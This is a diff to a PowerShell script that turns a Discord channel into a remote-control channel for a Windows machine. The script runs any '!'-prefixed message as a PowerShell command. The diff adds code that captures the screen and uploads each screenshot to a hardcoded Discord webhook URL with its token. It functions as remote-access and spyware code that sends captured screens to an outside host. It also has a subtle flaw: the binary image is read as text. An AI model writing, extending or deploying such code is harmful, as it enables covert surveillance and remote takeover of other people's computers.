@@ -41,68 +41,66 @@ function Send-DiscordMessage {
 
 # Function to capture a screenshot and save it as a file in the %TEMP% directory
 function Capture-Screenshot {
-    param (
-        [string]$filePath = "$env:TEMP\screenshot.png"
-    )
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-Type -AssemblyName System.Drawing
 
-    try {
-        Add-Type -AssemblyName System.Drawing
-        $bitmap = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
-        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-        $graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
-        $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
+    # Capture the primary screen
+    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+    $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
+    $graphics = [Drawing.Graphics]::FromImage($bitmap)
+    $graphics.CopyFromScreen(0, 0, 0, 0, $screen.Size)
 
-        Write-Host "Screenshot saved to $filePath"
-        return $filePath
-    } catch {
-        Write-Host "Error capturing screenshot: $_"
-        return $null
-    }
+    # Save screenshot to %TEMP% directory with timestamp
+    $fileName = "$env:TEMP\screenshot_$((Get-Date).ToString('yyyyMMdd_HHmmss')).png"
+    $bitmap.Save($fileName, [System.Drawing.Imaging.ImageFormat]::Png)
+
+    return $fileName
 }
 
-# Function to send an image file to Discord
-function Send-DiscordImage {
+# Function to send screenshot to Discord via webhook
+function Send-DiscordWebhook {
     param (
+        [string]$webhookUrl,
         [string]$filePath
     )
 
-    if (-not (Test-Path $filePath)) {
-        Write-Host "Screenshot file not found at $filePath"
-        return
+    # Create multipart content with the file
+    $fileName = [System.IO.Path]::GetFileName($filePath)
+    $boundary = [System.Guid]::NewGuid().ToString()
+    
+    $LF = "`r`n"
+    $bodyLines = (
+        "--$boundary",
+        "Content-Disposition: form-data; name=`"payload_json`"",
+        "Content-Type: application/json$LF",
+        "{`"content`":`"New screenshot uploaded`"}",
+        "--$boundary",
+        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
+        "Content-Type: image/png$LF",
+        [System.IO.File]::ReadAllText($filePath),
+        "--$boundary--$LF"
+    ) -join $LF
+
+    $headers = @{
+        "Content-Type" = "multipart/form-data; boundary=$boundary"
     }
 
-    # Read the file into a byte array
+    # Send the POST request to Discord with the image
     try {
-        $fileStream = [System.IO.File]::OpenRead($filePath)
-        $fileName = [System.IO.Path]::GetFileName($filePath)
-
-        $multipartContent = New-Object System.Net.Http.MultipartFormDataContent
-        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
-        $fileContent.Headers.ContentDisposition = [System.Net.Http.Headers.ContentDispositionHeaderValue]::Parse("form-data; name=`"file`"; filename=`"$fileName`"")
-        $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("image/png")
-
-        $multipartContent.Add($fileContent, "file", $fileName)
-
-        # Send the POST request to Discord with the image
-        $response = $client.PostAsync("$baseUrl/channels/$channelId/messages", $multipartContent).Result
-        if ($response.IsSuccessStatusCode) {
-            Write-Host "Image sent successfully."
-        } else {
-            Write-Host "Error sending image. Status code: $($response.StatusCode)"
-            $responseContent = $response.Content.ReadAsStringAsync().Result
-            Write-Host "Response: $responseContent"
-        }
+        $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $bodyLines
+        Write-Host "Screenshot sent successfully."
+        Write-Host "Response: $($response | ConvertTo-Json -Depth 3)"
     } catch {
-        Write-Host "Error sending image: $_"
+        Write-Host "Error sending screenshot: $_"
     }
 }
 
-# Function to capture a screenshot and send it to Discord
+# Function to capture a screenshot and send it to Discord when !screenshot or !sh command is issued
 function CaptureAndSendScreenshot {
-    $filePath = Capture-Screenshot  # Capture screenshot and get the file path
+    $screenshot = Capture-Screenshot  # Capture screenshot and get the file path
 
-    if ($filePath) {
-        Send-DiscordImage -filePath $filePath  # Send the image to Discord
+    if ($screenshot) {
+        Send-DiscordWebhook -webhookUrl $WebhookUrl -filePath $screenshot  # Send the image to Discord
     } else {
         Write-Host "Screenshot capture failed, no file to send."
     }
@@ -164,6 +162,9 @@ function Initialize-LastMessageId {
     }
 }
 
+# Webhook URL (replace with your own)
+$WebhookUrl = "https://discord.com/api/webhooks/1279434221747961947/4v9LMvOEODPdrCLAPkBxgkjRc5Hkwfx2DkwBNy8AjJjp56aOwuuechnScKGGb77trwPb"
+
 # Initialize the bot
 Initialize-LastMessageId
 
@@ -178,7 +179,8 @@ while ($true) {
                 if ($message.content.StartsWith("!")) {
                     $command = $message.content.Substring(1)  # Remove the "!" but do not convert to lowercase
 
-                    if ($command -eq "screenshot") {
+                    # Check for !screenshot or !sh command
+                    if ($command -eq "screenshot" -or $command -eq "sh") {
                         CaptureAndSendScreenshot  # Capture and send the screenshot
                     } else {
                         Execute-PowerShellCommand -command $command
